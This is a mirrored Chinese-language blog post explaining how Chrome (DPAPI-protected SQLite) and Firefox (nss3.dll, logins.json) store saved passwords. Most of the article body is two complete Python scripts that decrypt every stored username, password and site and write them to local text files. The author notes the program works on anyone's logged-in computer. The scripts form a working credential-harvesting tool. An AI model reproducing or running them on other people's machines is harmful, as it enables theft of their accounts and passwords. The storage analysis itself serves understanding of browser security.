@@ -1,0 +1,481 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"kerisa.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="在看一篇木马的分析时看到里面提到木马会读取浏览器的用户配置文件，并对其中的密码进行提取和上传，于是就有了兴趣，想看看浏览器是怎么对密码进行储存的。 现在 chrome 要查看浏览器保存的密码时需要首先验证登录账户的密码了，但这样其实保存的密码还是不够安全的，因为这个认证可以直接绕过。下面来分析一下 chrome 保存密码的方式，以及如何对保存的密码进行提取。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="获取浏览器存储密码">
+<meta property="og:url" content="https://kerisa.github.io/527/index.html">
+<meta property="og:site_name" content="Re: Memory (mirror)">
+<meta property="og:description" content="在看一篇木马的分析时看到里面提到木马会读取浏览器的用户配置文件，并对其中的密码进行提取和上传，于是就有了兴趣，想看看浏览器是怎么对密码进行储存的。 现在 chrome 要查看浏览器保存的密码时需要首先验证登录账户的密码了，但这样其实保存的密码还是不够安全的，因为这个认证可以直接绕过。下面来分析一下 chrome 保存密码的方式，以及如何对保存的密码进行提取。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://kerisa.github.io/assets/imgs/2018/08/firefox-pwd.png">
+<meta property="article:published_time" content="2018-08-05T14:41:32.000Z">
+<meta property="article:modified_time" content="2025-07-21T18:42:00.757Z">
+<meta property="article:author" content="flandre">
+<meta property="article:tag" content="chrome">
+<meta property="article:tag" content="decrypt">
+<meta property="article:tag" content="firefox">
+<meta property="article:tag" content="mozilla">
+<meta property="article:tag" content="password">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://kerisa.github.io/assets/imgs/2018/08/firefox-pwd.png">
+
+<link rel="canonical" href="https://flandre-scarlet.moe/blog/527/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>获取浏览器存储密码 | Re: Memory (mirror)</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Re: Memory (mirror)</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://kerisa.github.io/527/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/sys-imgs/42553027_1.png">
+      <meta itemprop="name" content="flandre">
+      <meta itemprop="description" content="This is a mirror/backup site of flandre-scarlet.moe. It serves as a fallback when the original site is inaccessible.">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Re: Memory (mirror)">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          获取浏览器存储密码
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2018-08-05 22:41:32" itemprop="dateCreated datePublished" datetime="2018-08-05T22:41:32+08:00">2018-08-05</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-07-22 02:42:00" itemprop="dateModified" datetime="2025-07-22T02:42:00+08:00">2025-07-22</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%A8%8B%E5%BA%8F/" itemprop="url" rel="index"><span itemprop="name">程序</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>5.1k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>5 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>在看一篇木马的分析时看到里面提到木马会读取浏览器的用户配置文件，并对其中的密码进行提取和上传，于是就有了兴趣，想看看浏览器是怎么对密码进行储存的。</p>
+<p>现在 chrome 要查看浏览器保存的密码时需要首先验证登录账户的密码了，但这样其实保存的密码还是不够安全的，因为这个认证可以直接绕过。下面来分析一下 chrome 保存密码的方式，以及如何对保存的密码进行提取。</p>
+<span id="more"></span>
+<h1 id="·chrome"><a href="#·chrome" class="headerlink" title="·chrome"></a>·chrome</h1><p>chrome 的密码储存在目录 %localappdata%\Google\Chrome\User Data\Default\Login Data 文件中。打开文件可以看到大大的“SQLite format 3”嗯。。。文件看来是没有加密的。<img src="/assets/imgs/2018/08/firefox-pwd.png" alt="代码"></p>
+<p>然后看一下关键的密码，因为 chromium 是开源的，所以先去代码里翻翻看，可以找到使用的加密算法，在 components\os_crypt\os_crypt_win.cc 中可以看到，EncryptString16 &#x2F; DecryptString16 分别使用的是 WIN32 API <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/desktop/api/dpapi/nf-dpapi-cryptprotectdata">CryptProtectData</a> 和 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/windows/desktop/api/dpapi/nf-dpapi-cryptunprotectdata">CryptUnprotectData</a>。</p>
+<p>而这对 API 使用用户的登录凭据作为密钥来加密数据，也就是说比如在 Windows 上只有同一个用户才能解开这些已加密的数据，所以使用别的账户登录或是将文件复制到别的电脑上再进行解密都是不行的。</p>
+<p>到这里就可以发现：只要用户已经登录，那么无需额外的密码就可直接获得浏览器存储的密码，只需跑一段代码即可。。。那么不说木马这些了，如果你能接触到他人的电脑，只要直接运行一下程序就能获取他的这些密码。</p>
+<p>所以下面就来展示一下这样的代码吧w 流程很简单：只要从文件中查找中所有的记录，然后将密码字段里的数据逐个解密保存就好了。另外因为 chrome 运行时会锁定该文件，所以运行下面的代码前需要退出 chrome。获取到用户名和密码为空的字段说明该网站被设置为“一律不保存”。根据浏览器最初使用的不同，用户数据所在目录可能不是“Default”，这种情况把变量“chrome_path”更新下就行。 直接上代码： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -\*- coding: utf-8 -\*- import os import win32crypt import sqlite3 SaveFileName = r&quot;pwd.txt&quot; def Extract(): chrome\_path = r&quot;Google\\Chrome\\User Data\\Default\\Login Data&quot; file\_path = os.path.join(os.environ\[&#x27;LOCALAPPDATA&#x27;\], chrome\_path) if not os.path.exists(file\_path): return conn = sqlite3.connect(file\_path) cursor = conn.cursor() cursor.execute(&quot;select username\_value, password\_value, signon\_realm from logins&quot;) with open(SaveFileName, &#x27;wb&#x27;) as o: for data in cursor.fetchall(): password = win32crypt.CryptUnprotectData(data\[1\], None, None, None, 0) o.write(&quot;UserName：&quot; + data\[0\].encode(&quot;utf8&quot;)) o.write(&quot;\\nPassword：&quot; + password\[1\]) o.write(&quot;\\nURL：&quot; + data\[2\].encode(&quot;utf8&quot;)) o.write(&quot;\\n\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\\n&quot;) if \_\_name\_\_ == &quot;\_\_main\_\_&quot;: Extract()</span></span><br></pre></td></tr></table></figure></p>
+<h1 id="·Firefox"><a href="#·Firefox" class="headerlink" title="·Firefox"></a>·Firefox</h1><p>火狐的密码也是保存在用户的个人配置中，分为一个保存密钥的 key4.db SQLite数据库和加密数据的 logins.json，两者均存放在 %AppData%\Mozilla\Firefox\Profiles 下的子目录中。其加密方式是通过 nss3.dll 模块进行的，算法用的是 3DES(CBC)。另外火狐有主密码，该密码并未保存在任何地方，所以如果用户设置了主密码，那么解密时也需要提供该密码才能解密，这比起 chrome 来要安全不少。</p>
+<p>解密的话可以调用 nss3.dll 的接口进行，提取结果保存到 %UserProfile%\output.txt 中（OutputFilePath变量）。代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -\*- coding: utf-8 -\*- import base64 import configparser import ctypes import json import os SEC\_SUCCESS = 0 SEC\_FAILURE = -1 NssDll = None ProfilePath = &#x27;&#x27; JsonConfigPath = &#x27;&#x27; OutputFilePath = &#x27;&#x27; # 填入主密码 MasterPwd = &#x27;&#x27; class SECItem(ctypes.Structure): \_fields\_ = \[ (&#x27;type&#x27;, ctypes.c\_int), (&#x27;data&#x27;, ctypes.c\_char\_p), (&#x27;len&#x27;, ctypes.c\_uint), \] def InitNssDll(masterPwd): path = ctypes.c\_char\_p() path.value = ProfilePath.encode(&#x27;utf-8&#x27;) mpwd = ctypes.c\_char\_p() mpwd.value = masterPwd.encode(&#x27;utf-8&#x27;) global NssDll NssDll = ctypes.CDLL(r&quot;nss3.dll&quot;) if NssDll.NSS\_Init(path) != SEC\_SUCCESS: print(&#x27;NSS\_Init failed&#x27;) return False keySlot = NssDll.PK11\_GetInternalKeySlot() if keySlot == 0: print(&#x27;PK11\_GetInternalKeySlot failed&#x27;) return False if NssDll.PK11\_CheckUserPassword(ctypes.c\_int(keySlot), mpwd) != SEC\_SUCCESS: print(&#x27;PK11\_CheckUserPassword failed&#x27;) return False if NssDll.PK11\_Authenticate(keySlot, 1, 0) != SEC\_SUCCESS: print(&#x27;PK11\_Authenticate failed&#x27;) return False return True def LoadJsonPwdData(): entries = \[\] with open(JsonConfigPath, &quot;r&quot;) as o: js = json.load(o) for i in range(len(js\[&#x27;logins&#x27;\])): entries.append(&#123; &#x27;username&#x27;:js\[&#x27;logins&#x27;\]\[i\]\[&#x27;encryptedUsername&#x27;\], &#x27;pwd&#x27;:js\[&#x27;logins&#x27;\]\[i\]\[&#x27;encryptedPassword&#x27;\], &#x27;url&#x27;:js\[&#x27;logins&#x27;\]\[i\]\[&#x27;hostname&#x27;\]&#125;) return entries def Decode(cipher): data = base64.b64decode(cipher) secItem = SECItem() cipherItem = SECItem() cipherItem.type = 0 cipherItem.data = data cipherItem.len = len(data) if NssDll.PK11SDR\_Decrypt(ctypes.byref(cipherItem), ctypes.byref(secItem), 0) != SEC\_SUCCESS: print(&#x27;PK11SDR\_Decrypt failed&#x27;) raise result = ctypes.string\_at(secItem.data, secItem.len).decode(&#x27;utf8&#x27;) return result def DocodeEntry(entry): try: entry\[&#x27;username&#x27;\] = Decode(entry\[&#x27;username&#x27;\]) entry\[&#x27;pwd&#x27;\] = Decode(entry\[&#x27;pwd&#x27;\]) except: print(&#x27;Error when decode \[ &#x27; + entry\[&#x27;url&#x27;\] + &#x27; \]&#x27;) entry\[&#x27;username&#x27;\] = &#x27;&lt;Error&gt;&#x27; entry\[&#x27;pwd&#x27;\] = &#x27;&lt;Error&gt;&#x27; def DetermineProfileDirPath(): iniPath = os.path.join(os.environ\[&#x27;APPDATA&#x27;\], r&#x27;Mozilla\\Firefox\\profiles.ini&#x27;) config = configparser.ConfigParser() config.read(iniPath) return os.path.join(os.environ\[&#x27;APPDATA&#x27;\], r&#x27;Mozilla\\Firefox&#x27;, config\[&#x27;Profile0&#x27;\]\[&#x27;Path&#x27;\]) def main(): global ProfilePath global JsonConfigPath global OutputFilePath ProfilePath = DetermineProfileDirPath() JsonConfigPath = os.path.join(ProfilePath, r&#x27;logins.json&#x27;) OutputFilePath = os.path.join(os.environ\[&#x27;USERPROFILE&#x27;\], r&#x27;output.txt&#x27;) # 切换工作目录 os.chdir(os.path.join(os.environ\[&#x27;PROGRAMFILES(X86)&#x27;\], r&#x27;Mozilla Firefox&#x27;)) if not InitNssDll(MasterPwd): return entries = LoadJsonPwdData() for i in range(len(entries)): DocodeEntry(entries\[i\]) with open(OutputFilePath, &#x27;w&#x27;) as o: json.dump(entries, o, indent=1) if \_\_name\_\_ == &quot;\_\_main\_\_&quot;: main()</span></span><br></pre></td></tr></table></figure> 这个是处理 32 位版本的，要处理 64 位版本的话安装相应版本的 python 即可，然后切换的目标工作目录也换掉就行。
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>flandre
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://kerisa.github.io/527/" title="获取浏览器存储密码">https://kerisa.github.io/527/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/chrome/" rel="tag"># chrome</a>
+              <a href="/tags/decrypt/" rel="tag"># decrypt</a>
+              <a href="/tags/firefox/" rel="tag"># firefox</a>
+              <a href="/tags/mozilla/" rel="tag"># mozilla</a>
+              <a href="/tags/password/" rel="tag"># password</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/501/" rel="prev" title="CrackMe 反汇编练习之 024、026">
+      <i class="fa fa-chevron-left"></i> CrackMe 反汇编练习之 024、026
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/539/" rel="next" title="DDSystem 游戏封包分析">
+      DDSystem 游戏封包分析 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%C2%B7chrome"><span class="nav-number">1.</span> <span class="nav-text">·chrome</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%C2%B7Firefox"><span class="nav-number">2.</span> <span class="nav-text">·Firefox</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt=""
+      src="/sys-imgs/42553027_1.png">
+  <p class="site-author-name" itemprop="name"></p>
+  <div class="site-description" itemprop="description">This is a mirror/backup site of flandre-scarlet.moe. It serves as a fallback when the original site is inaccessible.</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">102</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">247</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2016 – 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">flandre</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">328k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">4:58</span>
+</div>
+  <div class="powered-by">Powered by love
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
